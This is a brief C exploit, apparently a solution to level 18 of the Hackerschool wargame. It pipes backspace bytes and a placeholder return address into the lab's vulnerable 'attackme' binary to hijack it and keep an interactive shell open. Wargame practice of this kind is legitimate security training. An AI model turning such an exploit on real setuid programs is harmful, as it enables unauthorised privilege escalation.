/*
 * Author : superdk@hanmail.net
 * DATA : exploit code level18 of hackerschool
 * LICENSE : GNU License
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define VICTIM					"/home/level18/attackme"
#define BACK       				0x08
#define DEFAULT_BUFFER_SIZE     256


int main(int argc, char **argv)
{
	char shAddr[BACK + 1] = "deadbeef";
	char cmdBuf[DEFAULT_BUFFER_SIZE];

	sprintf(cmdBuf, "(printf \"\\x%x\\x%x\\x%x\\x%x\\x%c%c\\x%c%c\\x%c%c\\x%c%c\"; cat) | %s",
					BACK, BACK, BACK, BACK, shAddr[6], shAddr[7], shAddr[4], shAddr[5], shAddr[2], shAddr[3], shAddr[0], shAddr[1], VICTIM);
	printf("%s\n", cmdBuf);
	system(cmdBuf);
} 